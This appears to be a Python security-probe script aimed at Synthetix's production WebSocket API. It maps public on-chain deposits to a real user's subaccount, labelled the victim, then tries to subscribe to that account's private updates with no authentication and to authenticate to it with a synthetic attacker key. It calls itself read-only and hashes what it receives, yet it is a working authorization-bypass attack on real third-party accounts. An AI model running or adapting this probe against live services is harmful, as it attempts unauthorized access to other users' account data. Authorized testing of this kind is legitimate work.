#!/usr/bin/env python3
"""Redacted, read-only WebSocket authorization probe for Synthetix PAPI.

The probe derives a candidate subaccount from public deposit receipts, then uses
only a deterministic synthetic attacker key. It checks unauthenticated private-
channel subscription and foreign-account authentication status. No trading or
state-changing method is sent. Any push payload is reduced to type/schema/hash;
raw account data is never retained.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
import websockets

OUT = pathlib.Path("ws_auth_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
WS_TRADE = "wss://papi.synthetix.io/v1/ws/trade"
WS_INFO = "wss://papi.synthetix.io/v1/ws/info"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
)
ATTACKER_KEY = "0x" + "66" * 32
ATTACKER = Account.from_key(ATTACKER_KEY)
SYNTHETIC_ID = 999_999_999_999_999_989
UA = "authorized-read-only-security-review/1.0"
MAX_BODY = 2 * 1024 * 1024
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
AUTH_TYPES = {
    "EIP712Domain": DOMAIN_FIELDS,
    "AuthMessage": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "timestamp", "type": "uint256"},
        {"name": "action", "type": "string"},
    ],
}


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes]:
    req = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read(MAX_BODY + 1)
            if len(body) > MAX_BODY:
                raise ValueError("response too large")
            return response.status, body
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(MAX_BODY + 1)


def rpc(method: str, params: list[Any]) -> Any:
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    errors: list[str] = []
    for url in RPC_URLS:
        try:
            status, body = post_json(url, payload)
            parsed = json.loads(body)
            if status >= 400 or "error" in parsed:
                errors.append(f"{status}:{parsed.get('error')}")
                continue
            return parsed["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def topic_address(value: str) -> str:
    return "0x" + value[-40:]


def account_ids(wallet: str) -> list[str]:
    status, body = post_json(
        PAPI_INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": wallet, "includeDelegations": True}},
    )
    parsed = json.loads(body)
    if status != 200 or parsed.get("status") != "ok":
        return []
    response = parsed.get("response")
    if isinstance(response, list):
        values = response
    elif isinstance(response, dict):
        values = response.get("subAccountIds", []) or []
    else:
        values = []
    return [str(value) for value in values if str(value).isdigit()]


def discover_target() -> tuple[str, str]:
    for tx_hash in DEPOSIT_TX_HASHES:
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if not isinstance(receipt, dict):
            continue
        for log in receipt.get("logs", []):
            topics = log.get("topics", [])
            if (
                str(log.get("address", "")).lower() == DEPOSIT_PROXY.lower()
                and len(topics) >= 3
                and str(topics[0]).lower() == ASSET_DEPOSITED_TOPIC.lower()
            ):
                beneficiary = topic_address(topics[2])
                ids = account_ids(beneficiary)
                if ids:
                    return beneficiary, ids[0]
    raise RuntimeError("No public deposit beneficiary mapped to an owned account")


def sign_auth(subaccount_id: int, timestamp: int) -> tuple[dict[str, Any], str]:
    message = {"subAccountId": subaccount_id, "timestamp": timestamp, "action": "websocket_auth"}
    full_message = {
        "types": AUTH_TYPES,
        "primaryType": "AuthMessage",
        "domain": DOMAIN,
        "message": message,
    }
    signed = ATTACKER.sign_message(encode_typed_data(full_message=full_message))
    signature = "0x" + format(signed.r, "064x") + format(signed.s, "064x") + format(signed.v, "02x")
    payload = {
        "types": AUTH_TYPES,
        "primaryType": "AuthMessage",
        "domain": DOMAIN,
        "message": {
            "subAccountId": hex(subaccount_id),
            "timestamp": hex(timestamp),
            "action": "websocket_auth",
        },
    }
    return payload, signature


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 3:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(item, depth + 1) for key, item in sorted(value.items())}
    if isinstance(value, list):
        return {"type": "list", "count": len(value), "sample": schema(value[0], depth + 1) if value else None}
    return type(value).__name__


def summarize_message(raw: str) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        return {"json": False, "bytes": len(raw.encode()), "sha256": digest(raw)}
    result = parsed.get("result") if isinstance(parsed, dict) else None
    error = parsed.get("error") if isinstance(parsed, dict) else None
    status = parsed.get("status") if isinstance(parsed, dict) else None
    if status is None and isinstance(result, dict):
        status = result.get("status")
    return {
        "json": True,
        "topLevelKeys": sorted(parsed.keys()) if isinstance(parsed, dict) else None,
        "requestId": parsed.get("id") or parsed.get("requestId") if isinstance(parsed, dict) else None,
        "method": parsed.get("method") if isinstance(parsed, dict) else None,
        "status": status,
        "errorCode": error.get("code") if isinstance(error, dict) else None,
        "resultSchema": schema(result),
        "bodySha256": digest(raw),
        "bodyBytes": len(raw.encode()),
    }


async def receive_summaries(ws: Any, seconds: float = 3.0, limit: int = 5) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    deadline = asyncio.get_running_loop().time() + seconds
    while len(results) < limit:
        remaining = deadline - asyncio.get_running_loop().time()
        if remaining <= 0:
            break
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=remaining)
        except asyncio.TimeoutError:
            break
        results.append(summarize_message(raw))
    return results


async def unauthenticated_subscribe(url: str, victim_id: str, name: str) -> dict[str, Any]:
    try:
        async with websockets.connect(url, additional_headers={"User-Agent": UA}, ping_interval=None) as ws:
            await ws.send(json.dumps({
                "id": "1",
                "method": "subscribe",
                "params": {"type": "subAccountUpdates", "sub_account_id": victim_id},
            }))
            messages = await receive_summaries(ws)
            return {"name": name, "connected": True, "messages": messages}
    except Exception as exc:  # noqa: BLE001
        return {"name": name, "connected": False, "errorType": type(exc).__name__, "errorSha256": digest(str(exc))}


async def foreign_auth(subaccount_id: int, name: str) -> dict[str, Any]:
    timestamp = int(time.time() * 1000)
    payload, signature = sign_auth(subaccount_id, timestamp)
    try:
        async with websockets.connect(WS_TRADE, additional_headers={"User-Agent": UA}, ping_interval=None) as ws:
            await ws.send(json.dumps({
                "id": "1",
                "method": "auth",
                "params": {"message": json.dumps(payload, separators=(",", ":")), "signature": signature},
            }))
            messages = await receive_summaries(ws)
            return {"name": name, "connected": True, "messages": messages}
    except Exception as exc:  # noqa: BLE001
        return {"name": name, "connected": False, "errorType": type(exc).__name__, "errorSha256": digest(str(exc))}


async def main() -> None:
    beneficiary, victim_id = discover_target()
    tests = [
        await unauthenticated_subscribe(WS_TRADE, victim_id, "trade_endpoint_unauth_private_subscribe"),
        await unauthenticated_subscribe(WS_INFO, victim_id, "info_endpoint_private_channel_subscribe"),
        await foreign_auth(int(victim_id), "foreign_account_auth"),
        await foreign_auth(SYNTHETIC_ID, "nonexistent_account_auth_control"),
    ]
    summary = {
        "safety": "Read-only auth/subscribe status checks only; no trade or state-changing method; no raw victim data retained.",
        "attackerAddress": ATTACKER.address,
        "victimBeneficiarySha256": digest(beneficiary.lower()),
        "victimSubaccountIdSha256": digest(victim_id),
        "tests": tests,
        "unexpectedAcceptance": any(
            any(message.get("status") in (200, "subscribed", "ok", "authenticated") for message in test.get("messages", []))
            for test in tests
        ),
    }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
